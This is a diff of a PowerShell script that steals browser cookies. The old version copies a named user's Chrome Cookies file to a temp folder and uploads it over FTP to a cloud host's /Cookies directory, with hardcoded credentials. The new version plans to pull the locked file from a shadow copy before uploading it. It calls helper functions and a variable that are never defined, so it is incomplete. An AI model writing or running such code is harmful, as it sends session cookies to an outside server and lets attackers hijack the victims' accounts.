@@ -1,63 +1,53 @@
+# Include necessary assemblies for FTP
+Add-Type -AssemblyName System.Net
+
 # FTP server details
 $FTP_HOST = "us-east-1.sftpcloud.io"
 $FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
 $FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'
 
-# Directories to work with
-$source_directory = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
-$target_directory = "C:\temp"
-
-# Function to upload files to the FTP server, directing files to /Cookies directory
+# Function to upload files to the FTP server
 function Upload-ToFtp {
     param (
-        [String]$file_path,
-        [String]$file_name
+        [String]$FilePath,
+        [String]$FileName
     )
-    # Load Assembly and create FTPWebRequest to /Cookies directory
-    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
-    Add-Type -AssemblyName System.Net
-    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
-    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
-    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-    $ftpRequest.UseBinary = $true
-    $ftpRequest.KeepAlive = $false
-
-    # Read file content
-    $content = Get-Content -Path $file_path -Encoding Byte -ReadCount 0
-    $ftpRequest.ContentLength = $content.Length
-
-    # Get request stream and upload the file
-    $requestStream = $ftpRequest.GetRequestStream()
-    $requestStream.Write($content, 0, $content.Length)
-    $requestStream.Close()
-
-    Write-Host "Uploaded $file_name to FTP in /Cookies."
+    $FtpUrl = "ftp://$FTP_HOST/Cookies/$FileName"
+    $FtpRequest = [System.Net.FtpWebRequest]::Create($FtpUrl)
+    $FtpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
+    $FtpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+    $FtpRequest.UseBinary = $true
+    $FtpRequest.KeepAlive = $false
+    $Content = [System.IO.File]::ReadAllBytes($FilePath)
+    $FtpRequest.ContentLength = $Content.Length
+    $RequestStream = $FtpRequest.GetRequestStream()
+    $RequestStream.Write($Content, 0, $Content.Length)
+    $RequestStream.Close()
+    Write-Host "Uploaded $FileName to FTP in /Cookies."
 }
 
-# Attempt to copy the file using Robocopy
-function Copy-FileWithRobocopy {
-    param (
-        [String]$source_directory,
-        [String]$target_directory,
-        [String]$file_name
-    )
-    $robocopyResult = robocopy $source_directory $target_directory $file_name /R:0 /W:0
-    if ($robocopyResult -match "0 file\(s\) copied") {
-        Write-Host "The file was not copied, it might be in use or does not exist."
-        return $false
-    } else {
-        Write-Host "File copied successfully."
-        return $true
+# Main script continues...
+# Assuming previous steps for creating shadow copy and identifying file to copy
+
+if ($shadowCopyPath) {
+    $sourceFilePath = Join-Path -Path $sourceDirectory -ChildPath $fileName
+    $targetFilePath = Join-Path -Path $targetDirectory -ChildPath $fileName
+
+    # Attempt to copy the file from the shadow copy to the target path
+    try {
+        Copy-FileFromShadow -ShadowCopyPath $shadowCopyPath -SourceFilePath $sourceFilePath -TargetFilePath $targetFilePath
+        Write-Host "File copied successfully from shadow copy to $targetFilePath"
+
+        # Proceed to upload the file to FTP
+        Upload-ToFtp -FilePath $targetFilePath -FileName $fileName
     }
-}
-
-# Main script to check, copy, and upload the file
-$file_name = [System.IO.Path]::GetFileName($source_directory)
-$temp_path = Join-Path -Path $target_directory -ChildPath $file_name
-
-if (Copy-FileWithRobocopy -source_directory $source_directory -target_directory $target_directory -file_name $file_name) {
-    Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
-    Remove-Item -Path $temp_path -Force # Clean up the temporary file
+    catch {
+        Write-Error "Failed to copy file from shadow copy: $_"
+    }
+    finally {
+        # Clean up the shadow copy to free up resources
+        Remove-ShadowCopy -ShadowCopyId $shadowCopyPath
+    }
 } else {
-    Write-Host "Failed to copy or upload the file."
+    Write-Host "Could not create shadow copy."
 }
